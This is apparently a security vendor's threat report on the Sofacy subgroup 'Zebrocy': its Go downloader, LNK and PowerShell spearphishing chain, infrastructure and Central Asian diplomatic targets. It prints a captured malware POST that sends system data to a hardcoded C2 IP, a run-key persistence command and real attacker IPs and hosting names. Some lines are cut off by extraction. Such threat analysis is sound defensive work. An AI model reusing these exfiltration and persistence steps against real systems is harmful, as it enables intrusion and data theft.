Adding Original Findings to the Discussion
Last year at SAS2018 in Cancun, Mexico, “Masha and these Bears” included discussion of a
subset of Sofacy activity and malware that we call “Zebrocy”, and predictions for the decline
of SPLM/XAgent Sofacy activity coinciding with the acceleration of Zebrocy activity and
innovation. Zebrocy was initially introduced as a Sofacy backdoor package in 2015, but the
Zebrocy cluster has carved a new approach to malware development and delivery to the
world of Sofacy. In line with this approach, we will present more on this Zebrocy innovation
and activity playing out at SAS 2019 in Singapore.
Our colleagues at Palo Alto recently posted an analysis of Zebrocy malware. The analysis is
good and marked their first detection of a Zebrocy Go variant as October 11, 2018. Because
there is much to this cluster, clarifying and adding to the discussion is always productive.

Our original “Zebrocy Innovates – Layered Spearphishing Attachments and Go
Downloaders” June 2018 writeup documents the very same downloader, putting the initial
deployment of Zebrocy Go downloader activity at May 10, 2018. And while the targeting in
the May event was most likely different from the October event, we documented this same
Go downloader and same C2 was used to target a Kyrgyzstan organization. Also interesting
is that the exact same system was a previous Zebrocy target earlier in 2018. So, knowing
that this same activity is being reported on as “new” six months later tells us a bit about the
willingness of this group to re-use rare components and infrastructure across different
targets.
While they are innovating with additional languages, as we predicted in early 2018, their
infrastructure and individual components may have more longevity than predicted.
Additionally, at the beginning of 2018, we predicted the volume of Zebrocy activity and
innovation will continue to increase, while the more traditional SPLM/XAgent activity will
continue to decline. Reporting on SPLM/XAgent certainly has followed this course in 2018 as
SPLM/XAgent detections wind down globally, as has Sofacy’s use of this malware from our
perspective.
Much of the content below is reprinted from our June document.
The Sofacy subset we identify as “Zebrocy” continues to target Central Asian government
related organizations, both in-country and remote locations, along with a new middle eastern
diplomatic target. And, as predicted, they continue to build out their malware set with a
variety of scripts and managed code. In this case, we see new spearphishing components –
an LNK file maintaining powershell scripts and a Go-implemented system information
collector/downloader. This is the first time we have observed a well-known APT deploy
malware with this compiled, open source language “Go”. There is much continued recent
Zebrocy activity using their previously known malware set as well.
Starting in May 2018, Zebrocy spearphished Central Asian government related targets
directly with this new Go downloader. For example, the attachment name included one “30144.arj” compressed archive, an older archiver type handled by 7zip, Rar/WinRAR, and
others. Users found “30-144.exe” inside the archive with an altered file icon made to look like
the file was a Word document (regardless of the .exe file extension). And in a similar fashion
in early June, Zebrocy spearphished over a half-dozen accounts targeting several Central
Asian countries’ diplomatic organizations with a similar scheme “2018-05-InvitationLetter(1).rar//2018-05-Invitation-Letter(pril).docx”, sending out a more common Zebrocy
Delphi downloader.
In other cases, delivery of the new Go downloader was not straightforward. The new Go
downloader also was delivered with a new spearphishing object that rolls up multiple layers
of LNK file, powershell scripts, base64 encoded content, .docx files and the Go downloader
files. The downloader is an unusually large executable at over 1.5mb, written to disk and
launched by a powershell script. So the attachment that arrived over email was large.
2/8

The powershell script reads the file’s contents from a very large LNK file that was included as
an email attachment, and then writes it to disk along with a Word document of the same
name. So, launching the downloader is followed with the opening of an identically named
decoy word document with “WINWORD.EXE” /n “***\30-276(pril).docx” /o”. The downloader
collects a large amount of system information and POSTs it to a known Zebrocy C2, then
pulls down known Zebrocy Delphi payload code, launches it, and deletes itself.
We observed previous, somewhat similar spearphishing scenarios with an archive containing
.LNK, .docx, and base64 encoded executable code, delivering offensive Finfisher objects in
separate intrusion activity clusters. This activity was not Sofacy, but the spearphishing
techniques were somewhat similar – the layered powershell script attachment technique is
not the same, but not altogether new.
And, it is important to reiterate that these Central Asian government and diplomatic targets
are often geolocated remotely. In the list of target geolocations, notice countries like South
Korea, the Netherlands, etc. In addition to Zebrocy Go downloader data, this report provides
data on various other observed Zebrocy malware and targets over the past three months.

Spreading
Mostly all observed Zebrocy activity involves spearphishing. Spearphish attachments arrive
with .rar or .arj extensions. Filename themes include official government correspondence
invitations, embassy notes, and other relevant items of interest to diplomatic and government
staff. Enclosed objects may be LNK, docx, or exe files.
A decoy PDF that directly targeted a Central Asian nation is included in one of the .arj
attachments alongside the Go downloader. The content is titled “Possible joint projects in
cooperation with the International Academy of Sciences” and lists multiple potential projects
requiring international cooperation with Tajikistan and other countries. This document
appears to be a legitimate one that was stolen, created mid-May 2018. While we cannot
reprint potentially leaked information publicly, clearly, the document was intended for a
Russian-language reader.

Powershell launcher from within LNK
The LNK containing two layers of powershell script and base64 encoded content is an
unusual implementation – contents from a couple are listed at the technical appendix. When
opened, the script opens the shortcut file it is delivered within (“30-276(pril).docx.lnk”), pulls
out the base64 encoded contents (in one case, from byte 3507 to byte 6708744), base64
decodes the content and another layer of the same powershell decoding. This script writes
two files to disk as “30-276(pril).exe” and “30-276(pril).docx” and opens both files, leading to
the launch of the Go language system information collector/downloader and a decoy Word
document.

This new Go component not only downloads and executes another Zebrocy component, but
it enumerates and collects a fair amount of system data for upload to its C2, prior to
downloading and executing any further modules. It simply collects data using the systeminfo
utility, and in turn makes a variety of WMI calls.
After collecting system information, the backdoor calls out to POST to its hardcoded C2, in
this case a hardcoded IP/Url. Note that the backdoor simply uses the default Go user-agent:
“POST /technet-support/library/online-service-description.php?id_name=345XXXD5
HTTP/1.1
Host: 89.37.226.148
User-Agent: Go-http-client/1.1”
With this POST, the module uploads all of the system information it just gathered with the
exhaustive systeminfo utility over http: hostname, date/time, all hardware, hotfix, service and
software information.
The module then retrieves the gzip’d, better known Zebrocy dropper over port 80 as part of
an encoded jpg file, writes it to disk, and executes from a command line:
“cmd /C c:\users\XXX\appdata\local\Identities\{83AXXXXX-986F-1673-091A02XXXXXXXXXX}\w32srv.exe”
and adds a run key persistence entry with the system utility reg.exe:
cmd /C “reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Driveupd /d

This AutoIT dropper writes out a Delphi payload, consistent with previous behavior going
back to November 2015, initially described in our January 2016 report “Zebrocy – Sofacy

Infrastructure
5/8

Zebrocy backdoors are configured to directly communicate with IP assigned web server
hosts over port 80, and apparently the group favors Debian Linux for this part of
infrastructure: Apache 2.4.10 running on Debian Linux. A somewhat sloppy approach
continues, and the group set up and configured one of the sites with digital certificates using
a typical Sofacy-sounding domain that they have not yet registered: “weekpost.org”. Digital
certificate details are provided in the appendix.
These “fast setup” VPS servers run in “qhoster[.]com” can be paid for with Webmoney,
Bitcoin, Litecoin, Dash, Alfa Click, Qiwi, transfers from Sberbank Rossii, Svyaznoy,
Promsvyazbank, and more. Although, it appears that Bitcoin and Dash may be of the most
interest to help ensure anonymous transactions. Dataclub provides similar payment
methods:

One of the VPS IP addresses (80.255.12[.]252) is hosted in the “afterburst[.]com”/Oxygem
range. This service is the odd one out and is unusual because it only supports VISA/major
credit cards and Paypal at checkout. If other payment options are provided, they are not a
part of the public interface.

Victims and Targeting
Zebrocy Go downloader 2018 targets continue to be Central Asian government foreign policy
and administrative related. Some of these organizations are geolocated in-country, or locally,
and some are located remotely. In several cases, these same systems have seen multiple
artefacts from Zebrocy over the course of 2017 and early 2018:
• Kazakhstan
• Kyrgyzstan
• Azerbaijan
• Tajikistan
Additional recent Zebrocy target geo-locations (targeting various Central Asian/ex-USSR
local and remote government locations):
• Qatar
• Ukraine
• Czech Republic
• Mongolia
• Jordan
• Germany
• Belgium

Attribution
Zebrocy activity is a known subset of Sofacy activity. We predicted that they would continue
to innovate within their malware development after observing past behavior, developing with
Delphi, AutoIT, .Net C#, Powershell, and now “Go” languages. Their continued targeting,
phishing techniques, infrastructure setup, technique and malware innovation, and previously
known backdoors help provide strong confidence that this activity continues to be Zebrocy.

Conclusions
Zebrocy continues to maintain a higher level of volume attacking local and remote ex-USSR
republic Central Asian targets than other clusters of targeted Sofacy activity. Also interesting
with this Sofacy sub-group is the innovation that we continue to see within their malware
development. Much of the spearphishing remains thematically the same, but the remote
locations of these Central Asian targets are becoming more spread out – South Korea,
Netherlands, etc. While their focus has been on Windows users, it seems that we can expect
the group to continue making more innovations within their malware set. Perhaps all their
components will soon support all OS platforms that their targets may be using, including
Linux and MacOS. Zebrocy spearphishing continues to be characteristically higher volume
for a targeted attacker, and most likely that trend will continue.
And, as their spearphishing techniques progress to rival Finfisher techniques without
requiring zero-day exploitation, perhaps Zebrocy will expand their duplication of more
sources of open source spearphishing techniques.
